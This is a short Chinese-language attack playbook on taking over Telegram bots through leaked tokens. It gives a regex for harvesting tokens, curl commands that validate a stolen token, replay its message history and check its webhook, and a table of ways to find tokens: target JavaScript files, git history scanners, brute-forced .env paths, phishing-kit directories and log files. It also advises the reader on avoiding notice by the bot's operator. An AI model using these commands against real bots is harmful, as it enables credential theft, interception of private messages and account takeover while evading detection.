## A 面: Token 泄露 → 全接管(最高频)
```bash
# Token 格式: <bot_id>:<35位secret>;grep 正则
grep -oE '[0-9]{10}:[A-Za-z0-9_-]{35}'
# 验证 + 回放历史
curl -s "https://api.telegram.org/bot${TOKEN}/getMe"
curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1000"
# 先 getWebhookInfo(有 webhook=bot 在跑,动静大)再决定截流或只 forwardMessage
curl -s "https://api.telegram.org/bot${TOKEN}/getWebhookInfo"
```

| 泄露途径 | 打法 |
|---|---|
| 前端 JS 硬编码 | `curl -s https://target/_nuxt/*.js \| grep -oE '[0-9]{10}:[A-Za-z0-9_-]{35}'` |
| GitHub/历史 | `gitleaks detect` / `trufflehog git`(规则 `[0-9]{10}:...35`) |
| .env/docker-compose | `/.env`、`/docker-compose.yml` 目录爆破 `BOT_TOKEN=` |
| 钓鱼 kit | open dir 挖 `sign/*.html` 每变体轮换自己的 token |
| 日志 | laravel.log/app.log 搜 token 正则 |

**拿到 token 别立刻 getUpdates 拉全量**(运营者可能监控);先 getWebhookInfo 评估。

